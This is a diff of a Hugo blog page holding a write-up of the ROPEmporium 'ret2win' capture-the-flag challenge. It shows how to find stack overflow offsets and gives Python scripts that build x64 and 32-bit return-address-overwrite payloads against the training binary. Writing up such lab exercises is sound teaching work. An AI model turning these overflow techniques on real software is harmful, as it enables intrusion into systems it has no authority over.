@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>ret2win - Arzedlab</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>ret2win | ROPEmporium [1] - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="description" content="One common introductory ROP challenge is known as ret2win. The goal is to call a specific function in the program called ret2win, which prints a success message and reveal a flag.txt" />
 	<meta property="og:image" content=""/>
-	<meta property="og:url" content="http://localhost:1313/posts/rop-ret2win/">
-  <meta property="og:site_name" content="Arzedlab">
-  <meta property="og:title" content="ret2win">
+	<meta property="og:url" content="http://localhost:1313/posts/ropemporium-ret2win/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="ret2win | ROPEmporium [1]">
   <meta property="og:description" content="One common introductory ROP challenge is known as ret2win. The goal is to call a specific function in the program called ret2win, which prints a success message and reveal a flag.txt">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
@@ -15,7 +15,7 @@
     <meta property="article:modified_time" content="2024-11-11T11:41:24+05:00">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="ret2win">
+  <meta name="twitter:title" content="ret2win | ROPEmporium [1]">
   <meta name="twitter:description" content="One common introductory ROP challenge is known as ret2win. The goal is to call a specific function in the program called ret2win, which prints a success message and reveal a flag.txt">
 <script src="http://localhost:1313/js/feather.min.js"></script>
 	
@@ -39,7 +39,7 @@
 <body>
         <div class="content"><header>
 	<div class="main">
-		<a href="http://localhost:1313/">Arzedlab</a>
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
 	</div>
 	<nav>
 		
@@ -58,12 +58,30 @@
 <main>
 	<article>
 		<div class="title">
-			<h1 class="title">ret2win</h1>
+			<h1 class="title">ret2win | ROPEmporium [1]</h1>
 			<div class="meta">Posted on Nov 11, 2024</div>
 		</div>
 		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			ROPEmporium - 1, ret2win task writeup
+		</div>
 
 		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#x64---ret2win">x64 - ret2win</a></li>
+    <li><a href="#x64---payload">x64 - Payload</a></li>
+    <li><a href="#x64---result">x64 - Result</a></li>
+    <li><a href="#note">Note</a></li>
+    <li><a href="#x86-32---ret2win32">x86-32 - ret2win32</a></li>
+    <li><a href="#x86-32---payload">x86-32 - Payload</a></li>
+    <li><a href="#x86-32---result">x86-32 - Result</a></li>
+  </ul>
+</nav>
+		</div>
 
 		<section class="body">
 			<h1 id="ret2win">ret2win</h1>
@@ -75,16 +93,16 @@
 <ol>
 <li>To find out offset first we will generate cyclic pattern with 100 bytes</li>
 </ol>
-<p><img src="image%201.png" alt="image.png"></p>
+<p><img src="image1.png" alt="image.png"></p>
 <p>run the binary and put your generated cyclic payload into buffer, it overflows and responses with <code>SIGSEGV</code></p>
 <p>in that moment we go and check in which offset buffer ends and moves to registers RBP and to Return Address</p>
-<p><img src="image%202.png" alt="image.png"></p>
+<p><img src="image2.png" alt="image.png"></p>
 <p>This shows that to overwrite RBP, we need an offset of only 32 bytes, and to overwrite the saved RIP (or return address), we need an offset of 40 bytes.</p>
 <ol>
 <li>We can find the address of  <code>ret2win</code>  using the command <code>objdump -M intel -D ./binary | grep ret2win</code></li>
 </ol>
-<p><img src="image%203.png" alt="image.png"></p>
-<p>Payload:</p>
+<p><img src="image3.png" alt="image.png"></p>
+<h2 id="x64---payload">x64 - Payload</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> struct
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#6272a4"># Address of ret2win function (replace with the correct one from your binary)</span>
@@ -103,11 +121,11 @@
 </span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">.</span>write(payload)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Payload written to file. Length: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(payload)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> bytes&#34;</span>)
-</span></span></code></pre></div><p>Flag:</p>
-<p><img src="image%204.png" alt="image.png"></p>
+</span></span></code></pre></div><h2 id="x64---result">x64 - Result</h2>
+<p><img src="image4.png" alt="image.png"></p>
 <ul>
 <li>
-<p>Note</p>
+<h2 id="note">Note</h2>
 <p><code>struct.pack(&quot;&lt;Q&quot;, 0xdeadbeefdeadbeef)</code> converts the hexadecimal value into a binary representation using little-endian byte order.</p>
 <p><code>&lt;Q</code>  - For 64-bit little-endian</p>
 <p><code>&lt;I</code>  - For 32-bit little-endian
@@ -118,9 +136,9 @@ If you&rsquo;re segfaulting on a movaps instruction in <code>buffered_vfprintf()
 </ul>
 <h2 id="x86-32---ret2win32">x86-32 - ret2win32</h2>
 <p>We will determine the offset required for overflowing the stack and then place our entire payload there, just as we did with an <code>ret2win</code>.</p>
-<p><img src="image%205.png" alt="image.png"></p>
-<p><img src="image%206.png" alt="image.png"></p>
-<p>Payload:</p>
+<p><img src="image5.png" alt="image.png"></p>
+<p><img src="image6.png" alt="image.png"></p>
+<h2 id="x86-32---payload">x86-32 - Payload</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>import struct
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#6272a4"># Address of the ret2win function (replace with the correct address from your 32-bit binary)</span>
@@ -139,8 +157,8 @@ If you&rsquo;re segfaulting on a movaps instruction in <code>buffered_vfprintf()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(f<span style="color:#f1fa8c">&#34;Payload length: {len(payload)} bytes&#34;</span>)
 </span></span></code></pre></div><p>If you’re not using GDB with GEF, try reversing the binary and calculating the offset; this is often easier to accomplish with IDA.</p>
-<p>Flag:</p>
-<p><img src="image%207.png" alt="image.png"></p>
+<h2 id="x86-32---result">x86-32 - Result</h2>
+<p><img src="image7.png" alt="image.png"></p>
 
 		</section>
 
@@ -156,8 +174,7 @@ If you&rsquo;re segfaulting on a movaps instruction in <code>buffered_vfprintf()
     <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
     <a class="border"></a></div>
   <div class="footer-info">
-    2024  © Ravshan |  <a
-      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+    2024  © Ravshan |  
   </div>
 </footer>
 <script>
